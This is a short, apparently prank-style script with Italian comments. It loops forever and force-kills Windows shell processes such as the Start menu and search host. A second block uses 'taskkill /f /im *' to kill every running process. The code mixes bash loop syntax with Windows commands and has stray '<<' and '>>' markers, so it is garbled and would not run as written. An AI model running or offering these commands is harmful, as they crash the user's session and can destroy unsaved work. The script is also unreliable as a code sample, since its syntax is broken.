while :
do

   echo "Scritta all'infinito"
   taskkill explore.exe /f /t
   taskkill SearchApp.exe /f /t
   taskkill TextInputHost.exe /f /t
   taskkill StartMenuExperienceHost.exe /f /t
   
done
#termina tutti i processi

<<
while :
do
<<
   echo "Scritta all'infinito"
   taskkill /f /im *
done
>>